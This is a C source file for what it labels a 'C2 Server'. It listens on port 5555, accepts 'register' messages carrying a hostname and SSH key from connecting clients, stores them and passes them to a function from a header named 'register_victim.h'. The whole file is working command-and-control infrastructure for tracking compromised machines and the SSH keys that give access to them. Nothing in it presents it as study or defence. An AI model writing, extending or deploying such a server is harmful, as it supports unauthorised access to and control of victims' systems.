#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include "server.h"
#include "register_victim.h"

Client clients[MAX_CLIENTS];
int client_count = 0;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

void* handle_client(void* arg) {
    int client_sock = *(int*)arg;
    free(arg);

    char buffer[1024];
    ssize_t len;

    while ((len = recv(client_sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[len] = '\0';

        char *cmd = strtok(buffer, " ");
        if (cmd && strcmp(cmd, "register") == 0) {
            char *hostname = strtok(NULL, " ");
            char *sshkey = strtok(NULL, " ");

            if (hostname && sshkey) {
                pthread_mutex_lock(&lock);
                if (client_count < MAX_CLIENTS) {
                    strncpy(clients[client_count].hostname, hostname, sizeof(clients[client_count].hostname)-1);
                    strncpy(clients[client_count].sshkey, sshkey, sizeof(clients[client_count].sshkey)-1);
                    clients[client_count].hostname[sizeof(clients[client_count].hostname)-1] = '\0';
                    clients[client_count].sshkey[sizeof(clients[client_count].sshkey)-1] = '\0';
                    client_count++;
                    printf("[+] New client registered: %s - Key: %s\n", hostname, sshkey);
                    register_simple(hostname, sshkey);
                }
                pthread_mutex_unlock(&lock);
            }
        }
    }

    close(client_sock);
    return NULL;
}

int main() {
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(5555);

    bind(server_sock, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_sock, 5);

    printf("[*] C2 Server listening on port 5555\n");

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t addrlen = sizeof(client_addr);
        int *client_sock = malloc(sizeof(int));
        *client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &addrlen);
        pthread_t tid;
        pthread_create(&tid, NULL, handle_client, client_sock);
        pthread_detach(tid);
    }

    return 0;
}